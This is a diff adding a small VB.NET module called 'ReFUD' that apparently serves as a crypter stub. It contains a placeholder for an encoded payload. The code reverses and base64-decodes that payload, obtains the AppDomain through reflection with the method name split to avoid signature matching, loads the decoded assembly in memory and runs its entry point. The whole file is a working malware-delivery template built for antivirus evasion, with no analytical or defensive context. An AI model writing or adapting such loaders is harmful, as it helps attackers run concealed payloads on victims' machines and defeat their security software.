@@ -1,0 +1,15 @@
+Module ReFUD
+    Sub Main()
+        Dim B As String() = New String() {
+[stub-replace]
+ }
+        Dim S As String = ""
+        For i = 0 To B.Length - 1
+            S += B(i).ToString
+        Next
+        Dim A As Object = GetType(Threading.Thread).GetMethod("Get" + "Domain").Invoke(0, Nothing)
+        Dim K As Object = A.load(Convert.FromBase64String(StrReverse(S)))
+        Dim C As Object = K.entrypoint
+        C.invoke("", Nothing)
+    End Sub
+End Module
